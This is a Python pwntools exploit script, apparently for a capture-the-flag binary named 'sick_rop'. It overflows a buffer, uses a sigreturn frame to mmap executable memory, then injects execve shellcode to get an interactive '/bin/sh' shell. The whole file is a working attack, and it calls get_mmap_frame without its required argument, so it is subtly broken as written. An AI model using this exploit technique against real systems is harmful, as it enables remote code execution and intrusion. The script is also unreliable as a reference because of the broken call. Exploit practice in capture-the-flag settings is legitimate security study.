#!/usr/bin/env python3

from pwn import *
import time

exe = ELF("./sick_rop")

context.binary = exe
SYSCALL_RET = p64(0x00401014)
VULN = p64(0x000000000040102e)

WRITE_ADDR = 0x400000

def conn():
    if args.LOCAL or args.DEBUG:
        r = process([exe.path])
        #gdb.attach(r)
    else:
        r = remote("x", 1)

    return r

def get_mmap_frame(write_addr):
    f = SigreturnFrame(kernel="amd64")
    f.rax = 9
    f.rdi = 0x0
    f.rsi = 0x1000
    f.rdx = 0x1 | 0x2 | 0x4
    f.r10 = 0x2 | 0x20 | 0x10
    f.r8 = 0
    f.r9 = 0
    f.rip = u64(SYSCALL_RET)
    f.rsp = 0x400090
    return bytes(f)

def main():
    r = conn()

    mmap_payload = b"A" * 40
    mmap_payload += VULN
    mmap_payload += SYSCALL_RET
    mmap_payload += get_mmap_frame()

    f = open("./execve_shellcode_mmap", 'rb');
    shellcode = b"\x90\x90\x90\x90";
    shellcode += f.read();
    shellcode += b"A" * (0x100 - 0x56 - len(shellcode))
    shellcode += b"/bin/sh\x00";

    r.send(mmap_payload)
    r.recv(len(mmap_payload))
    r.send(b"A" * 15)
    r.recv(15)
    r.send(shellcode);

    # We should have shell, program will likely crash afterwards
    r.interactive()


if __name__ == "__main__":
    main()
